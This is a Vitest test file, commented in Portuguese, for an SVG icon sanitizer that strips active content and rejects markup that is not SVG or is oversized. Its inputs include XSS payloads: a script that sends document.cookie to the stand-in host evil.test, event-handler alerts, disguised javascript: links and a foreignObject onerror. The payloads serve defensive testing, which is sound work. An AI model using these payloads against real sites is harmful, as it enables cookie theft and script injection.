// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import {
  SVG_ICON_MAX_BYTES,
  SVG_ICON_REJECTION_MESSAGES,
  looksLikeSvgMarkup,
  prepareSvgIcon,
} from "@/domain/tasks/svgIcon";

/**
 * `prepareSvgIcon` é a primeira das duas barreiras da feature 086 (a segunda é o consumo por
 * `<img>`, coberto em `svgIconSecurity.test.tsx`). O que estes testes precisam provar não é que a
 * função "não quebra", e sim que **o texto que sai daqui — o único que sobe para o bucket público
 * — não carrega conteúdo ativo**, e que cada recusa cai na razão certa (é a razão que escolhe a
 * mensagem mostrada ao usuário).
 *
 * Roda em jsdom (o `@vitest-environment` no topo, mesmo recurso de
 * `src/domain/notes/__tests__/outline.test.ts`) porque a limpeza acontece num documento inerte do
 * `DOMParser` — que é justamente o ponto: o parser real é quem decodifica entidade, normaliza caso
 * de atributo e desfaz os disfarces que um teste de regex sobre string deixaria passar.
 */
describe("prepareSvgIcon", () => {
  it("um SVG simples passa e volta com o mesmo desenho, sem nada removido", () => {
    const result = prepareSvgIcon(
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 4h16v16H4z"></path></svg>'
    );

    expect(result).toEqual({
      ok: true,
      svg: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 4h16v16H4z"></path></svg>',
      removedSomething: false,
    });
  });

  it("espaço em volta não conta, e o viewBox mantém a caixa alta (o parser de HTML corrige o caso)", () => {
    const result = prepareSvgIcon(
      '\n  <svg viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" /></svg>\n'
    );

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.svg).toContain('viewBox="0 0 10 10"');
    expect(result.svg).toContain("<circle");
    expect(result.removedSomething).toBe(false);
  });

  it("SVG colado de dentro de uma página (sem xmlns) ganha o namespace, senão o arquivo não desenha", () => {
    const result = prepareSvgIcon('<svg viewBox="0 0 24 24"><path d="M1 1"></path></svg>');

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.svg).toContain('xmlns="http://www.w3.org/2000/svg"');
    // Acrescentar o namespace não é "remoção": o aviso de conteúdo removido continua desligado.
    expect(result.removedSomething).toBe(false);
  });

  it("<script> dentro do SVG some e removedSomething fica true", () => {
    const result = prepareSvgIcon(
      '<svg viewBox="0 0 24 24"><script>fetch("https://evil.test/"+document.cookie)</script><path d="M1 1"></path></svg>'
    );

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.svg).not.toContain("<script");
    expect(result.svg).not.toContain("document.cookie");
    expect(result.svg).toContain("<path");
    expect(result.removedSomething).toBe(true);
  });

  it("onload/onclick na raiz <svg> somem (a raiz também é conteúdo)", () => {
    const result = prepareSvgIcon(
      '<svg onload="alert(1)" onclick="alert(2)" viewBox="0 0 24 24"><rect width="4" height="4"></rect></svg>'
    );

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.svg).not.toContain("onload");
    expect(result.svg).not.toContain("onclick");
    expect(result.svg).not.toContain("alert");
    expect(result.svg).toContain("<rect");
    expect(result.removedSomething).toBe(true);
  });

  it('href="javascript:…" some, inclusive escrito com entidade e espaço no meio', () => {
    const result = prepareSvgIcon(
      '<svg viewBox="0 0 24 24"><a href="javascript:alert(1)"><text>x</text></a>' +
        '<a xlink:href="java&#9;script:alert(2)"><text>y</text></a></svg>'
    );

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.svg.toLowerCase()).not.toContain("javascript:");
    expect(result.svg).not.toContain("alert");
    expect(result.removedSomething).toBe(true);
  });

  it("<foreignObject> some inteiro — é por ele que HTML arbitrário entra num SVG", () => {
    const result = prepareSvgIcon(
      '<svg viewBox="0 0 24 24"><foreignObject width="24" height="24">' +
        '<img src="x" onerror="alert(1)"></foreignObject><path d="M1 1"></path></svg>'
    );

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.svg.toLowerCase()).not.toContain("foreignobject");
    expect(result.svg).not.toContain("onerror");
    expect(result.svg).not.toContain("<img");
    expect(result.removedSomething).toBe(true);
  });

  // A decisão fala em "markup que, depois da limpeza, fique sem nenhum elemento de desenho (era só
  // script/foreignObject)": o `<svg>` continua lá, mas vazio.
  it("SVG cujo conteúdo era só <script> dá empty-after-sanitize", () => {
    expect(prepareSvgIcon('<svg viewBox="0 0 24 24"><script>alert(1)</script></svg>')).toEqual({
      ok: false,
      reason: "empty-after-sanitize",
    });
  });

  it("SVG cujo conteúdo era só <foreignObject> dá empty-after-sanitize", () => {
    expect(
      prepareSvgIcon("<svg><foreignObject><b>oi</b></foreignObject></svg>")
    ).toEqual({ ok: false, reason: "empty-after-sanitize" });
  });

  it("<svg> vazio também dá empty-after-sanitize (não há desenho a salvar)", () => {
    expect(prepareSvgIcon('<svg viewBox="0 0 24 24"></svg>')).toEqual({
      ok: false,
      reason: "empty-after-sanitize",
    });
  });

  it("texto que não é SVG dá not-svg", () => {
    expect(prepareSvgIcon("meu ícone favorito")).toEqual({ ok: false, reason: "not-svg" });
  });

  // `<script>` solto, sem `<svg>` em volta, não chega a ser um SVG sujo: não é um SVG.
  it("um <script> solto dá not-svg", () => {
    expect(prepareSvgIcon("<script>alert(1)</script>")).toEqual({
      ok: false,
      reason: "not-svg",
    });
  });

  it("<div> com um <svg> dentro dá not-svg — a raiz precisa ser o SVG", () => {
    expect(prepareSvgIcon('<div><svg viewBox="0 0 1 1"><path d="M0 0"></path></svg></div>')).toEqual({
      ok: false,
      reason: "not-svg",
    });
  });

  it("texto solto antes do <svg> dá not-svg (colar um parágrafo junto não passa)", () => {
    expect(
      prepareSvgIcon('olha esse ícone: <svg viewBox="0 0 1 1"><path d="M0 0"></path></svg>')
    ).toEqual({ ok: false, reason: "not-svg" });
  });

  it("prólogo XML e comentário antes do <svg> não atrapalham (é como um .svg de arquivo começa)", () => {
    const result = prepareSvgIcon(
      '<?xml version="1.0" encoding="UTF-8"?>\n<!-- feito no Figma -->\n' +
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M1 1"></path></svg>'
    );

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    // O que sobe é só o elemento raiz — comentário e prólogo ficam de fora, e nada de lixo depois
    // do `</svg>`, que invalidaria o arquivo servido como image/svg+xml.
    expect(result.svg.startsWith("<svg")).toBe(true);
    expect(result.svg.endsWith("</svg>")).toBe(true);
  });

  it("markup acima do teto dá too-large, sem nem tentar analisar", () => {
    const huge = `<svg viewBox="0 0 24 24"><path d="${"M1 1".repeat(SVG_ICON_MAX_BYTES)}"></path></svg>`;
    expect(huge.length).toBeGreaterThan(SVG_ICON_MAX_BYTES);

    expect(prepareSvgIcon(huge)).toEqual({ ok: false, reason: "too-large" });
  });

  it("o teto é medido em bytes, não em caracteres (acento e emoji ocupam mais de um)", () => {
    // 33 KB de caracteres de 2 bytes = 66 KB, acima do teto de 64 KB, com `length` abaixo dele.
    const accented = "é".repeat(33 * 1024);
    const markup = `<svg viewBox="0 0 24 24"><text>${accented}</text></svg>`;
    expect(markup.length).toBeLessThan(SVG_ICON_MAX_BYTES);

    expect(prepareSvgIcon(markup)).toEqual({ ok: false, reason: "too-large" });
  });

  it("um SVG logo abaixo do teto ainda passa (o limite não é apertado demais)", () => {
    const filler = "M1 1 ".repeat(2000);
    const markup = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="${filler}"></path></svg>`;
    expect(markup.length).toBeLessThan(SVG_ICON_MAX_BYTES);

    expect(prepareSvgIcon(markup).ok).toBe(true);
  });

  it("string vazia (e só espaço) dá not-svg", () => {
    expect(prepareSvgIcon("")).toEqual({ ok: false, reason: "not-svg" });
    expect(prepareSvgIcon("   \n\t ")).toEqual({ ok: false, reason: "not-svg" });
  });

  it("toda razão de recusa tem mensagem própria", () => {
    const reasons = ["not-svg", "empty-after-sanitize", "too-large"] as const;
    for (const reason of reasons) {
      expect(SVG_ICON_REJECTION_MESSAGES[reason]).toBeTruthy();
    }
    expect(new Set(Object.values(SVG_ICON_REJECTION_MESSAGES)).size).toBe(reasons.length);
  });

  it("o teto declarado é 64 KB", () => {
    expect(SVG_ICON_MAX_BYTES).toBe(65536);
  });
});

describe("looksLikeSvgMarkup", () => {
  it("reconhece o markup colado que vale a pena abrir o campo, com ou sem prólogo", () => {
    expect(looksLikeSvgMarkup('<svg viewBox="0 0 1 1"></svg>')).toBe(true);
    expect(looksLikeSvgMarkup("  \n<svg>\n</svg>")).toBe(true);
    expect(looksLikeSvgMarkup('<?xml version="1.0"?><svg></svg>')).toBe(true);
    expect(looksLikeSvgMarkup("<!-- do Figma --><SVG></SVG>")).toBe(true);
  });

  it("não reage a texto comum, a URL, nem a HTML que só contém um SVG", () => {
    expect(looksLikeSvgMarkup("https://exemplo.com/icone.svg")).toBe(false);
    expect(looksLikeSvgMarkup("um texto qualquer")).toBe(false);
    expect(looksLikeSvgMarkup("<div><svg></svg></div>")).toBe(false);
    expect(looksLikeSvgMarkup("")).toBe(false);
  });
});
